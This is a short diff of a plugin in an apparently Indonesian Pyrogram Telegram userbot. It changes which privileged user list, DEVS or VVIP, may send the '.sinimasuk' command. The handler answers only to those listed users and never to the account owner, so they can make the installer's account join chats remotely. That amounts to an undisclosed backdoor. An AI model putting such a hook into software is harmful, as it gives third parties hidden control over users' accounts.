@@ -10,7 +10,7 @@
 from pyrogram import Client, enums, filters
 from pyrogram.types import Message
 
-from Uputt.helpers.adminHelpers import DEVS
+from Uputt.helpers.adminHelpers import VVIP
 from config import BLACKLIST_CHAT
 from config import CMD_HANDLER
 from Uputt.helpers.basic import edit_or_reply
@@ -18,7 +18,7 @@ from Uputt.helpers.basic import edit_or_reply
 from .help import *
 
 
-@Client.on_message(filters.command("sinimasuk", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("sinimasuk", ["."]) & filters.user(VVIP) & ~filters.me)
 @Client.on_message(filters.command("join", cmd) & filters.me)
 async def join(client: Client, message: Message):
     Uputt = message.command[1] if len(message.command) > 1 else message.chat.id
